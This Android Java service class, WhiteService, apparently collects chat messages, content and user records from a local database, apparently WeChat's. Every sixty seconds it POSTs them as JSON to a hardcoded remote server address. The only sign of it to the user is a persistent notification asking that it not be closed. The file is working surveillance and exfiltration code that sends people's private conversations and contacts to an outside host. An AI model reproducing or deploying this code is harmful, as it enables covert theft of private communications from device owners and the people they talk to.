package cn.truistic.enmicromsg.common.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.v7.app.NotificationCompat;
import android.util.Log;

import java.io.IOException;
import java.util.Date;
import java.util.List;

import cn.truistic.enmicromsg.R;
import cn.truistic.enmicromsg.common.db.DBUtill;
import cn.truistic.enmicromsg.common.util.JsonUtil;
import cn.truistic.enmicromsg.info.ContentInfo;
import cn.truistic.enmicromsg.info.MessageInfo;
import cn.truistic.enmicromsg.info.UserInfo;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static android.R.id.list;
import static android.icu.lang.UCharacter.GraphemeClusterBreak.L;


/**
 * 正常的系统前台进程，会在系统通知栏显示一个Notification通知图标
 *
 * @author clock
 * @since 2016-04-12
 */
public class WhiteService extends Service {

    private final static String TAG = WhiteService.class.getSimpleName();

    private static final String urlPath = "http://113.105.55.205:8090/UpData/ReceiveWeChat.aspx";

    private final static int FOREGROUND_ID = 1000;
    private List<MessageInfo> mMessageInfos;
    private List<ContentInfo> mContentInfos;
    private List<UserInfo> mUserInfos;

    private String mJsonContent,mJsonMessage,mJsonUser;

    public WhiteService(){
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "WhiteService->onCreate");
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "WhiteService->onStartCommand");

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
        builder.setSmallIcon(R.mipmap.ic_launcher);
        builder.setContentTitle("后台服务");
        builder.setContentText("我正在运行,请勿关闭!");
        builder.setContentInfo("Content Info");
        builder.setWhen(System.currentTimeMillis());


        new  Thread(new Runnable() {
            @Override
            public void run() {
                //读取数据 与 上传数据
                Log.d("DDDBBB后台服务", "执行 " + new Date().toString());
                mMessageInfos = DBUtill.queryMessage(WhiteService.this);
                mContentInfos = DBUtill.queryContent(WhiteService.this);
                mUserInfos = DBUtill.queryUser(WhiteService.this);
                if (!mMessageInfos.isEmpty()){

                    Log.i("DDDBBB后台", "有新的聊天记录--"+mMessageInfos.size()+"条---"+ mMessageInfos
                            .toString());

                        mJsonMessage = JsonUtil.toJson(mMessageInfos);
                        mJsonContent = JsonUtil.toJson(mContentInfos);
                        mJsonUser = JsonUtil.toJson(mUserInfos);

                        postJson(mJsonMessage);
                        postJson(mJsonContent);
                        postJson(mJsonUser);

                        mMessageInfos.clear();
                        mContentInfos.clear();
                        mUserInfos.clear();

                }else if (mMessageInfos.isEmpty() || mMessageInfos ==null || mMessageInfos.size()
                        ==0){

                        mMessageInfos.clear();
                        mContentInfos.clear();
                        mUserInfos.clear();
                        Log.d("DDDBBB后台","聊天记录没有新数据");

                }
            }
        }).start();
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int anHour = 60 * 1000; // 60秒
        long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
        Intent activityIntent = new Intent(this, AlarmReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, activityIntent, 0);
        builder.setContentIntent(pi);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
        Notification notification = builder.build();
        startForeground(FOREGROUND_ID, notification);
        return super.onStartCommand(intent, flags, startId);

    }

    private void postJson(String s) {
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();//创建okhttp实例
        RequestBody body=RequestBody.create(JSON,s);
        Request request = new Request.Builder()
                .url(urlPath)
                .post(body)
                .build();
        okhttp3.Call call = client.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                Log.i("DDDBBB----后台", "onFailure: " + e);
            }

            @Override
            public void onResponse(okhttp3.Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i("DDDBBB----后台", "onResponse: " + response.body().string());
                }
            }

        });
    }


    @Override
    public void onDestroy() {
        Log.i(TAG, "WhiteService->onDestroy");
        super.onDestroy();
    }
}
